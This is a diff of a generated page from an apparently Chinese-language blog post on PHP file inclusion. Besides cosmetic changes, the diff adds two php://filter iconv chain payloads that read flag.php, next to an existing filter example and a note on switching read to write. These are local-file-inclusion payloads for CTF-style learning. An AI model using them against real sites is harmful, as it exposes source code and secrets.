@@ -246,7 +246,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #03a9f4">文件包含</a>
+                <a href="/blog/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #ffa2c4">文件包含</a>
             </span>
             
             <span class="tag">
@@ -265,7 +265,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">669字</span>
+        <span class="post-count">693字</span>
       </span>
     </span>
 
@@ -320,7 +320,11 @@ php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"lfga= \" lfgaL&#123;xx&#125;x;\""</span><span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'UCS-2BE'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'UCS-2LE'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token delimiter important">?></span></span>
+
+// 一些其它的filterchain
+php://filter/convert.iconv.CP9066.CSUCS4/resource=flag.php
+php://filter/convert.iconv.UTF8.CSISO2022KR/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>  写入文件源码需把read改为write，encode改为decode</p>
 <p>​    </p>
